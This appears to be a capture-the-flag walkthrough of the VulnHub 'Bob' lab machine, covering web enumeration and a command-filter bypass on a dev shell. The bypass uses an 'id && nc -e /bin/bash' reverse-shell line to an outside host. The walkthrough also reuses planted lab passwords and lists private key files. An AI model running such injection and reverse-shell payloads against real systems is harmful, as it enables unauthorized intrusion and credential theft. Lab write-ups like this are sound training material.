# Bob VulnHub Machine

>Linux Milburg-High 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux
## Port 80 HTTP

**Gobuster**
/news.html (Status: 200)
/contact.html (Status: 200)
/about.html (Status: 200)
/login.html (Status: 200)
/index.html (Status: 200)
/robots.txt (Status: 200)
/passwords.html (Status: 200)
/server-status (Status: 403)

**Potential usernames**
- Dean MacDuffy
- Paul K
- Daniel R
- Alex F
- Robert J
- Bob J
- Sebastian W
- Elliot A
- Jospeh C

About us page
```
 Principle
Dean MacDuffy

Phone: +61-021-523-0891
Email: dean.m@milburghigh.com

Junior Deans
Paul K

Phone: +61-021-523-4215
Email: paul.k@milburghigh.com
Daniel R

Phone: +61-021-759-4328
Email: daniel.r@milburghigh.com
Senior Deans
Alex F

Phone: +61-022-125-8563
Email: alex.f@milburghigh.com
Robert J

Phone: +61-021-453-7194
Email: robert.k@milburghigh.com
IT Dept
Bob J

Phone: +61-021-743-4215
Email: admin@milburghigh.com
Sebastian W

Phone: +61-029-124-6842
Email: seb.w@milburghigh.com
Elliot A

Phone:
Email: elliot.a@protonmail.com
Jospeh C

Phone: +61-029-124-7842
Email: jc@milburghigh.com 
```

*robots.txt*
```
User-agent: *
Disallow: /login.php
Disallow: /dev_shell.php
Disallow: /lat_memo.html
Disallow: /passwords.html
```

passwords.html message:
```
Really who made this file at least get a hash of your password to display, hackers can't do anything with a hash, this is probably why we had a security breach in the first place. Comeon people this is basic 101 security! I have moved the file off the server. Don't make me have to clean up the mess everytime someone does something as stupid as this. We will have a meeting about this and other stuff I found on the server. >:(
-Bob 
```

*dev_shell.php*

![shell](img/rev_shell.php)

There seems to be some kind of filter which we can bypass by chaining our commands with a && operator. The id command is accepted so we can use it to ensure our second command always runs. 

nc also supports the -e switch so we can spawn a shell back with the following command into the dev shell.

>$ id && nc -e "/bin/bash" -nv 10.1.62.42 4242

We find the following message inside Elliot's home dir:

```
The admin is dumb,
In fact everyone in the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them for that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone else in the dept, he always yells at Sebastian and James now they do some dumb stuff but their new and this is just a high-school server who cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why do we need custom wallpapers that doesn’t do anything. I have been suggesting time and time again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same for his friend James who doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of time before it’s broken into so because of this I have changed my password to

theadminisdumb

I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same time it doesn’t affect me if they get breached, I get paid, he gets fired it’s a good time.
```

And su to Elliot's account.

staff.txt
```
Seb:

Seems to like Elliot
Wants to do well at his job
Gave me a backdoored FTP to instal that apparently Elliot gave him

James:

Does nothing
Pretty Lazy
Doesn't give a shit about his job

Elliot:

Keeps to himself
Always needs to challenge everything I do
Keep an eye on him
Try and get him fired
```

Interesting .sh script
```
elliot@Milburg-High:/home/bob/Documents/Secret/Keep_Out/Not_Porn/No_Lookie_In_Here$ ls -la
total 12
drwxr-xr-x 2 bob bob 4096 Mar  5  2018 .
drwxr-xr-x 3 bob bob 4096 Mar  5  2018 ..
-rwxr-xr-x 1 bob bob  438 Mar  5  2018 notes.sh
```

Passwd file
```
jc@Milburg-High:/home/bob$ more .old_passwordfile.html 
<html>
<p>
jc:Qwerty
seb:T1tanium_Pa$$word_Hack3rs_Fear_M3
</p>
</html>
```

```
Possible private SSH keys were found!                                                                                                                        
/home/bob/Downloads/proftpd-1.3.3c/tests/t/etc/modules/mod_sftp/ssh_host_rsa_key                                                                             
/home/bob/Downloads/proftpd-1.3.3c/tests/t/etc/modules/mod_sftp/test_rsa_key                                                                                 
/home/bob/Downloads/proftpd-1.3.3c/tests/t/etc/modules/mod_sftp/ssh_host_dsa_key                                                                             
/home/bob/Downloads/proftpd-1.3.3c/tests/t/etc/modules/mod_sftp/test_dsa_key                                                                                 
/home/bob/Downloads/proftpd-1.3.3c/tests/t/etc/modules/mod_tls/key-nul-subjaltname.pem                                                                       
/home/bob/Downloads/proftpd-1.3.3c/tests/t/etc/modules/mod_tls/server-cert.pem                                                                               
/home/bob/Downloads/proftpd-1.3.3c/tests/t/etc/modules/mod_tls/client-cert.pem                                                                               
/home/bob/Downloads/proftpd-1.3.3c/tests/t/etc/modules/mod_tls/ca-cert.pem 
```

